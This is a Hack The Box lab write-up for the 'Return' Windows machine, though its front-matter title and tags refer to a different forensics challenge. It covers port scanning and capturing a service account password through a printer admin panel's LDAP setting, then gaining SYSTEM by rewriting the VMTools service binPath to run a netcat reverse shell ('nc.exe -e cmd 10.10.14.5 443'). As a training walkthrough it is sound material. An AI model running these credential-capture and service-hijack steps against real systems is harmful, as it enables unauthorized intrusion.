---
title: 'Sherlock -  BFT'
date: 2025-09-16
permalink: /Forensic/:name/ #Esto hace que se muestre la url real
excerpt: "<img src='/images/HTB-Return.png' width='300' height='200'>"
collection: portfolio
tags:
- MfteCMD
- TimeLineExplorer
- HxD hex editor
---

Let's begin this new machine *(Return - 10.10.11.108)* scanning the ports with NMAP

``nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.108 -oG allPorts``

***Breackdown of the command***
- ``-sS`` tcp port scan
- ``--min-rate 5000`` sending packets no more slowly than 5000 per second
- ``-p-`` all ports" o "-p every port
- ``--open`` to only scan open ports.
- `-vvv` Verbose to see the results as they are found
- ``-n`` for no domain resolution.
- ``-oG`` for output in grep format.


Now that we have the ports, and we can use basic acknowledgement Nmap scripts

``nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49667,49670,49671,49676,49677,49681,49684,49699,52800 10.10.11.108 -oN targeted``

  
> **-sC**  Basic acknowledgment 
> **-sV**  Service and version 
> **-sCV**  combines -sC and -sV
> **-oN** For Nmap output

Thanks to the scanning, we can see that the machine has an SMB service

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXflmDRaliJm0IT2vQ_9ncCPjP-YLOWyKMt7xkKKsZx42Lh9yR8b5j6C0bkZRCueHT4oQN0CHPslEi-S19viTwxSvVGthtpK0uWi68UqqRwUPCQuMF3lhJCsNtt2gy64iuctS_87?key=bWHyPzuzLiae9ZvxPxh4wrUy)

Let's take a deeper look at the ``crackmapexec`` tool

>Note that crackmapexec is deprecated; the current tool is **NetExec**

``crackmapexec smb 10.10.11.108``
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdKpkJFlnoIQjhZcEHOLN9dMxxuN0dpaIo663_4I2J5y7uaV-h6SdMYX2JgqJtpg3jVgtLF_zPIYF14BiCi8TsZK9_BfWc-wpV7iBm5kc6ee8tMvL1STIfEiSC8gd4JzpJdbpIy9A?key=bWHyPzuzLiae9ZvxPxh4wrUy)

| Name       | Printer          |
| ---------- | ---------------- |
| **SMB**    | **Signed**       |
| **Domain** | **return.local** |


With ``smbclient -L`` we can try to list shared resources in SMB and as well as using null session.
``-N`` which means, without credentials *(Anonymous login)*
but, despite having an Anonymous login successful we cannot list 


![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeEVKSBbLWyUeGyyVSQCuV4onEhwsKWebKHe4kT82c2vg0aGLQSBPHGLVj2ztNb1BII21v2YLSkNp7d2BLKxUXRzPLkuNs_UsUcXBtrQaM3yYz_sUdyNmrsmei7uFA3AADGph0C?key=bWHyPzuzLiae9ZvxPxh4wrUy)

Let's try an alternative tool: `smbmap -H {ipVictim}`
we used `-H` because it means *`host`*

But it doesn't report anything.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcOKF4HOBoQ5jCidUFD6kbQK1u3tKdsswFI0dZn1wCb4CqNbmuCfk4vY5cUkv4TamNegsR6tGlmvmYAhXmZY2kRcMrLG6RKTHcwgQ8-X112O6NEEpRXEtqmXw-V19X0py5CVpkGEQ?key=bWHyPzuzLiae9ZvxPxh4wrUy)

So, we understand that we need to obtain credentials.


Now, we will examine our targeted document and use  ``grep http`` to filter for HTTP
``cat targeted | grep http``

Among other things, we can see a few interesting open ports:

- **Port 80** is open has **Microsoft-IIS  10.0.** running and features an HTB printer Admin Panel.
- **Port 5985** belongs to a **WinRM**, and we can use it with *evilRM* when we have the credentials.

>Windows Remote Management (WinRM) is Microsoft's implementation of the WS-Management protocol, a standard protocol for exchanging management data between computers. It's designed for remote management of systems, particularly in heterogeneous environments, allowing for interoperability between different hardware and operating systems.


![image](/images/HTB/2025-08-24-HTB-Return/TargetedImage.png)


Let's use `whatweb` to detect a bit more information.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfCoq2bZrvuEM35hReshLB9HMuKFk0y8J1LZl3zim9AQheoCkfUPSZ19Pfo9AcvRAnBk2_awI3m0BBdikdHVyGcXJLYqMTanzGY9vc3iHpen595gYTwnykh_-zyGsLuwBjXuQ1kpg?key=bWHyPzuzLiae9ZvxPxh4wrUy)


As we can see, it's _Microsoft-IIS 10.0_, and the website is _10.10.11.108_, which is the same target IP.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeWKqlWMhGj4Ac8tFPKg5P12Rhvh_qJoczr_sABqEIWVLM5H69LP1IHqoskCMUR8Sr8WMwpIGDsaRcBs5G2e2-nAiR0C3Si0ccQKGpKxfHwzJrNv2TxYb8lRVmxUxQcgvh8RyRz?key=bWHyPzuzLiae9ZvxPxh4wrUy)

we can go to the settings tab and we going to see that.
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcipvvZt2uIWDn2jtvSU4En-xARCGQ5X6WexV2S-vif2p4Ss_EpuZs_eVltwzKG_NwPlks-4XpT1Do-Hs7o_MkFuuRmbaFgeYggATBhupGMg5Iph-c3uPGPjlGf10hy7JqNX-sX?key=bWHyPzuzLiae9ZvxPxh4wrUy)

In this panel, we see the password field filled. Let's use F12 to examine it more closely. We can see that the input is `type = text`, which means that the `*****` is treated as text and not as a password.

> If the type is set to `password`, we can change it to `text` and attempt to decrypt it.

> However, nothing is certain, and it all depends on the situation and the service.


![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdmUT3WV-2YJagq3U9g2K6gcvJBLhHpFfa5U8o7odl9wqO8mhA462dvo9UKD5mtXlxZatY2UlXPgJ5cpfOON1TSCD5EGm0wNSGjRXrFKJVLO7hEsEUPKMZX2Rm5jFFvT-Jcw7z9?key=bWHyPzuzLiae9ZvxPxh4wrUy)

returning to the settings tab
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcipvvZt2uIWDn2jtvSU4En-xARCGQ5X6WexV2S-vif2p4Ss_EpuZs_eVltwzKG_NwPlks-4XpT1Do-Hs7o_MkFuuRmbaFgeYggATBhupGMg5Iph-c3uPGPjlGf10hy7JqNX-sX?key=bWHyPzuzLiae9ZvxPxh4wrUy)


If we are listening on port 389 with netcat *(`` nc -nlvp 389``)* and instead of telling it to connect to its domain *(``printer.return.local``)*, we instruct it to connect to our IP ``10.10.14.5`` and then click update.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXecVUEf_RSRP7GqpEHI9jY-jbphYyhhuYzYRwhQwy3et5yd-1299Bhh7Wti7VrfLngprizoof5DxSAt8DrF3vOkfjiQEP4RyKiVeNz9lXd7vez3Zolz53LawZmYjBbfXskxWkyNuQ?key=bWHyPzuzLiae9ZvxPxh4wrUy)

  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXecZp2PpmpHhl8XVh2mVyWDAFwSYAdTPjosoLKp-wnL3lqNUbkyT_ig8mwBbi6jJWKX7tYfZKRBPLU61Ek4Jbi5lcUJWsH10itYuu1qihHaQBv2krX_ke9OefOSpkHUl_eQMl1-?key=bWHyPzuzLiae9ZvxPxh4wrUy)

We can observe that the connection returns a username and a text that appears to be a password


![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdYKyTtVH2ls7myp1bnIEGWpdbJWI8M-wOrpv_vOeu0_QQ6tE23YBvKh8hHCczM3LZiNP0HM6pS4OUR1ZhmnS0trUokzuLsOw2REwulrBeJHktVa87nWwDzaax4qPCB-b2RWvz91A?key=bWHyPzuzLiae9ZvxPxh4wrUy)

Now, using CrackMapExec, let's try entering the username and password

>Note that crackmapexec is deprecated; the current tool is **NetExec**

``crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'`` 

We observe that the credentials are correct.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd4TdJF3ZA7m7ACYpnvtqJsXI-nELLijDB8FQbGgXeJQJTv_BaPGlp6NowXOkjy_-I0Ry7IXJoovBMyxf0qiKaV8_xhlkgm8a0Em6aI60R82_Inp7j1CGkV8S5Y77Sks797XImvUQ?key=bWHyPzuzLiae9ZvxPxh4wrUy)

  
We know that WinRm stands for **Windows Remote Management***, and this service runs on **port 5985**.
Let's try to connect to it.

For being this connection possible, the user **svc-printer** would to be inside the group ***remote management users***


``crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'``

![Image](/images/HTB/2025-08-24-HTB-Return/crackmapexecWinrm.png)

When this tool reports **pwn3d**, it means we have access to this account, and in this case, the user is a member of the ***Remote Management Users*** group.

To connect to the machine, we use Evil-WinRm


``evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'``

This provides us with a command prompt on the victim's Window machine.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfFBLrY0m_iDmdlyzPLkIMHIMYyZkr_R1AoXHV009IMsM1M-uxR0SMdu0eWH66DBEXZvpx51Shtuja25UiIpi0TLbDcyJ6WrjV0P3NrgyaArgzitF1JMefTzZmw08XLwko8jOC_6A?key=bWHyPzuzLiae9ZvxPxh4wrUy)

  
This confirms our access to the victim's machine

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXecIsOak4rAVXT_2ZEubQrN90FCUA6TD5vHXK4yEXGR5UwapTlsGUfM5lv1NCt_EorYZ92htY-D0eBFO-2db4tFL3s1NW0m78_XXdI75XcaSkEpwHzBNyjnOKczmLmOQKiC73Pd6Q?key=bWHyPzuzLiae9ZvxPxh4wrUy)

Whe then proceed to search for the user flag within the file system

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeidRjr7xqkt9t4xcNRTvSxw85wi4HRQjsOdDJAwI2fMgZ8iaIpytMGnju1QoXR8_v1JY-XNYGPfXIjW8rcnj-88PQd7p9UkfZmVHoKwbVmstPbY1I-9BweT_A3wsHQVXf-AxoxAQ?key=bWHyPzuzLiae9ZvxPxh4wrUy)

  
Perfect. Having found the user flag, the next step is to escalate our privileges to obtain the root flag

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdXvTaX_lIn73BJFj4bX-9936jhty44u2YiaavgEH1QjSDUf1FbKrbHLTDmK0FnBbhF1Qlo6xtyLzUbWU-Wd0mSf3SVDfdwPqDMiXo9sLfUaG3JdsrlxsRU3ngSOpdTbWoJpTrXSg?key=bWHyPzuzLiae9ZvxPxh4wrUy)

Our goal as attackers is to gain access to the Administrator's directory
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcZ9uOarZyvc1p8qBgehZH2RwQ6UIfbWeEn2cyZsHk2bTa7sQR8CRwwrfMksPMQR7OUWHMN6EU9HbnxRD19sz9QkGuvku9c3OoNR21LW0yNH81g31gNHwUF73MSMJ7iy21PCtbq?key=bWHyPzuzLiae9ZvxPxh4wrUy)

We can navigate to the directory, but we are denied read access to the `root.txt` flag due to insufficient permissions. Access requires **SYSTEM-level** privileges

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe9PktsoC706QM4_fKtoQM028HwVnGmX0irTzikpPsiqnjlKYMWvRJDCySwyOCOD7pSAHBcINZ3iHtmOlyCpLnmBFZzbe3xkFI0W-eeEWbZIkRgTX8M4Zu5Zeiz51wUVQki4nEncA?key=bWHyPzuzLiae9ZvxPxh4wrUy)


The command `cacls root.txt` was executed to inspect file's **A**ccess **C**ontrol **L**ist *(ACL)*, confirming our user lacks the necessary permissions.

>The `cacls` command is deprecated in modern versions of Windows, and it is recommended to use the `icacls` command instead, but we receive the same result.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXf_BImJPaz0TChRk-mRx0f8VSRCVv8gfFE9i-kbzFGuuM2D_ZUOhqeP7wQJ0faZmZ7OTPHyTDY8JzOU8xSwj7JLKQt9xm1OtzwZ7c0K_Rjxd3Jw9yDEnIkhQiNgcU7z2FqE3Ot2zg?key=bWHyPzuzLiae9ZvxPxh4wrUy)


We then executed `whoami /priv` to enumerate our currents user's privileges.
The output revealed several enabled privileges, which are potential vectors for privilege escalation.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfk7zlxDVYSm8LFDA_kmEiJTfvmkxZkHDkRY5D-AbJFVmBZYafhMuFaMlL1QIBwVjX61I1aMtF_Jqyrz_2g-Fmy9vMgcGttfhN18svWioGFPuNPYQj3g1JR96k9v83qrnugTJwfsg?key=bWHyPzuzLiae9ZvxPxh4wrUy)


Next, we gathered more information about the **svc-printer** account using the `net user svc-printer` command.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeGBex0ELixHJ7EPQTFlZ4DgJlBYRHrgEyoCBtzK1vE8o_H_wj7uYYbwimOq5cj316xC_qq2f2OECzN7yJaqKGLoerG-qQ0gjFvWCkrG33ulEfhNoHs9uyqakLfIJRolsalkJRRyQ?key=bWHyPzuzLiae9ZvxPxh4wrUy)


The ``net user`` output confirm that the **``svc-printer``** account is member of the **``print operators``** and **``Server operators``** groups. Crucially, it is also permitted for remote management, wich could facilitate lateral movement. 

According to oficial **``Microsoft documentation``** for the ***``Server operators``* group, members posses the ability to create, start, stop and configure services**. This privilege presents a clear vector for privilege escalation.

To explote this, we can list all services on the system using the `sc query` command or by launching the service management console *(`service.msc`)* ``service``


![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd9FXx-bRB6u9JhDz_eaR9rIERmO4EixyJL-w5Bv2ub6Pf3s2e-bCjvAhI7mx8hdX4Iq9vQ5AmJ136iRVllukBeGuguQxqwKp2Z846wBH3KW-8Mzj4JxJbnjQBgGz25q0i2tGkS?key=bWHyPzuzLiae9ZvxPxh4wrUy)

To process to transfer Netcat to the victim's machine is as follows:
- **Locate Netcat on the Attacker machine**: we use `locate nc.exe` command on our Kali Linux machine to find the Windows binary.
- **Prepare the File:** The found ``nc.exe`` binary is copied to our current working directory to ensure a straightforward path for the upload command.
- **Transfer the File**: Using Metasploit Framework's *(Evil-WinRm)* `upload` command, we transfer the ``nc.exe`` binary from the machine to the victim.


**``Locate Netcat on the Attacker machine``**

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcV32i_488QMC7RkCrDMCrA0fkd3y6d_td0v8CYIFIf_fclQPFBW9IS7KQksmSmYjRbjoufGggjNG7qQ8MDvLhfzAZF7U5G6NNd9Em0OFWyrYPWcsPC-nCMV3ErKNpp94rQqdZe?key=bWHyPzuzLiae9ZvxPxh4wrUy)

**``Prepare the File:``**

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeQJiif5SMFc9oUA0-a5te6AJwQLD52oBEvwODfHXPqzbso4SS_ZuwRNBnU81Zp5a9Jn0x4otCfVB8yuBooZep511V0qEJY4-O6f0xLY56rncj9Ynb3ea5tbCX4-c-F2CVDE8IK?key=bWHyPzuzLiae9ZvxPxh4wrUy)


**``Transfer the File``**

>**Note:** Write access to the `C:\Users\Administrator\Desktop\` directory was denied. Therefore, the file was uploaded to the writable `C:\Users\svc-printer\Desktop\` directory instead.


![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcm7RVTh-pfFxiJsM0JUroCbezRR-uUzz7Wg04VTxC2KO947YgSoisxYx3A6lBo-BfkQ8ZTYZ8wn4vg2Jo_e8xBuaNU0so3nrqxocSk02iEZpg1rM2qom4Sc4R8QsduAdoqjphbPA?key=bWHyPzuzLiae9ZvxPxh4wrUy)


Having identified the *"Server Operators"* group membership and transferred the necessary tools, we proceed with privilege escalation by creating a malicious service.
The `sc.exe` utility allows us to create a new service with a defined binary path *(binPath)*

We configure the service to execute the upload Netcat binary, which will initiate a reverse shell connection back to our attacker-controller machine.

The complete command is structure as follows:
``sc.exe create reverse binPath="C:\users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.5 443``

**Breakdown of the command**
- ``sc.exe create``: The command to create a new service
- ``reverse``: The chosen name for the new service
- ``binPath="..."``: The key parameter that defines the executable and its arguments to be run when te service starts.
- `C:\Users\svc-printer\Desktop\nc.exe`: The path to the uploaded Netcat binary
- `-e cmd 10.10.14.5 443`: The arguments for Netcat, instructing it to execute `cmd.exe` and connect back to our attacker IP `10.10.14.5` on port `443`

After creating the service, it must be starter to trigger the payload.
This is accomplished with the command `sc.exe start reverse`. 
If successful, this grant us a reverse shell with **NT AUTHORITY\SYSTEM** privileges

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfvOcDfM8dTb6GO04uuaA8To8n6fkmRMF3ivDyNctvtt6dC387kbXXjg22pNQKc-fzShPbdsQbpB0v2-S6EmctyyvGyOfVjawhQM_IDH_d9F8Yz68xwVcbH0WSrbM2EtK1bCJKQkQ?key=bWHyPzuzLiae9ZvxPxh4wrUy)


The initial attempt to create a new service named `reverse` resulted in *access is denied* error.
As an alternative strategy we pivoted to modify the binary path `binPath` of an existing non-critical service. The **W**indows **M**edia **P**layer **N**etwork **S**haring Service **(WMPNetworkSvc)** was selected as a first candidate for this manipulation.

The command structure to configure a service is similar to creation, but uses `config` parameter and specifies the the target service name.

`sc.exe config WMPNetworkSvc binPath="C:\users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.5 443"`

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeBWykMNuoBmTdOWNl1FjLr4NYYbgtZqVJyzyETS_2-VZK8Bq5UxpyMXrgROLTFldC6u6rBfDikV59PczXqHMTcs3sq7Wff_3nzgvf18I-bQeQ5w36xjzT6Ko5V8Lgf6IP9_Et0yg?key=bWHyPzuzLiae9ZvxPxh4wrUy)

However, this attempt also failed with an *access is denied* error.
This reveals a key nuance of the ***Server operators*** groups privileges:
 While members have broad permissions to manage services, modification, of certain core or protected services *(like WMPNetworkSvc)* is still restricted by the service's specific Access Control List *(ACL)*.

This **ACL** defines wich users or groups can modify or control that specific services.
To proceed, a systematic approach is required: enumerate all services and identify one with ACL that grants the *Server Operators* group the necessary `SERVICE_CHANGE_CONFIG` permissions. 

*service output*
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd9FXx-bRB6u9JhDz_eaR9rIERmO4EixyJL-w5Bv2ub6Pf3s2e-bCjvAhI7mx8hdX4Iq9vQ5AmJ136iRVllukBeGuguQxqwKp2Z846wBH3KW-8Mzj4JxJbnjQBgGz25q0i2tGkS?key=bWHyPzuzLiae9ZvxPxh4wrUy)


Though systematic enumeration of service permissions, we identified that the `VMware Tools` *(VMTools)* service had a weak Access Control List *(ACL)*. Our current user context, due to its membership in the ***Server operators*** group was granted the  `SERVICE_CHANGE_CONFIG` permission on this specific service.

This permission effectively grant us the ability to redefine the binary path that service executes, providing a direct  path of privilege scalation.

Alternatively for more concise summary:
Service **ACL** enumeration revealed that the VMware Tools *(VMTools)* service was misconfigured, granting the **Server operators** group the **SERVICE_CHANGE_CONFIG** permission. 
This vulnerability allows us to hijack the service for code execution

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd1X9kqhBY96fJ1IBVz5G23Ph_X2LOKqyUaMYJ2cExtmSkWH81JLdxUH8h2YuyO6Baki8vr9cWRI_P4dv6Ubdg4YJy-7MknkM3xHiK9orC0_9cuR3bO7HoniStFuQlZlCYup0VqDQ?key=bWHyPzuzLiae9ZvxPxh4wrUy)


With the VMTools service now reconfigured to execute our payload, the next step is to start the service, wich will run with  `NT AUTHORITY\SYSTEM` privileges. This will cause the service to execute our Netcat binary, initiating outbound an connection to our waiting listener.

On our Kali attacker machine, we establish a Netcat listener on the specified port *(443)* using the following command.

`nc -nvlp 443`

***breakdown of the listener flags:***
- `-n`: Disables to DNS resolution, speeding un the connection. 
- `-v`: (Verbose) Provides more detailed output, confirming when a connection is received.
- `-l`: (Listen) Puts Netcat into listener mode.
- `-p 443`: (Port) Specifies the port to listen on.

Once the service is started with `sc.exe start VMTools`, Netcat payload executes.
The windows machine connects back to our Kali listener, providing us with a reverse shell **running in the context of the high-privileged service account**, thus completing the privilege scalation.


``sc.exe stop VMTools``

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdDOsDKJJyhkpFx3C5H3gDLAqkUFSrBhEwuZogyV0lB8BXlFS10s7J9FJUz3jIUfS9lduUPNVBF3ekuhOtXOZvm3VRnQPgzkr24vELk76UfyIPSJ31heQiviooXjr98HI4CqWC-9Q?key=bWHyPzuzLiae9ZvxPxh4wrUy)

``sc.exe start VMTools``

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfufrGJA_J1-p8WPFsSPHU_OtxeTjG-7VPrnGpX0fe07zcH34JMngmQO6HmLIngYAXnxy62tOwOfIlKtJKrXLI_zJHlsTc4_yOEDanCvFyh4JQvqaDhorGFESLMiy1uRhER7xxOuQ?key=bWHyPzuzLiae9ZvxPxh4wrUy)

The Netcat listener successfully caught the reverse shell connection. 

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXftKiXoCQuJLtVDBIxiK8Cglht2mfWtExnRM-oUdi51Vg1ZIfBBkEm3JM6QiwsQ5CqLC3bocCZu7oG17BWgd8IJEU4pWyWdWFDlmfgaMACU7acXlh37fVZHBta271XyIpkUcRcfHw?key=bWHyPzuzLiae9ZvxPxh4wrUy)

The resulting shell is fully interactive, providing standard input and output .

To confirm the success of our privilege escalation, we executed the `whoami` command. 
The output `NT AUTHORITY\SYSTEM`, verifies that we achieved the highest level of privilege on the windows host. 
The malicious service executed our payload in the security context of the `SYSTEM` account.


![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXc0ifmWZN1oeVkNzAUxi5-w0pnEot3z0jP8fw6HN1qEcfaCyi3-AF6W0WWz-PyyX_EGPIQHj6S0U3tASVPEMHfwq3S9P7ne15IL-gBHxj-Y6miiNdyu_aqDkMBWBaum2tyQaz7qGg?key=bWHyPzuzLiae9ZvxPxh4wrUy)

The final objective of the assessment was to retrieve the proof-of-compromise, often referred to as the ***root flag*** or ***proof flag***.
On Windows system is typically located on the Administrator's desktop.
A directory listing of `C:\Users\Administrator\Desktop\` confirmed the presence of the **root.txt** file. 

The contents of this file were then read to complete the proof of successful system compromise. 

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcV0wCuVa0tzRv4iKl8vgp4eZZRQwENqDNZvInJwIJBljFxMK2vEE84noSXU7qg8fr_6yaInLKf_FPVCP3tQPuJlYfUsBKbCwuDPuokrNs3bZMwv7aB-i5HM16MLHNJK6vGYFJZrw?key=bWHyPzuzLiae9ZvxPxh4wrUy)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXf8y0Tr3VL78mdZKNceRSGUhX9VC6EeVSbt6X4MS86S19oxGRxGwNiB7z2JW5ffciSd4CFSSXQmCVFK0WeDnMqj8C5mSnLWi2JjJpBvJpoF9YiX1_OkzbUZwGM_cbAuHpK3dqTcUg?key=bWHyPzuzLiae9ZvxPxh4wrUy)
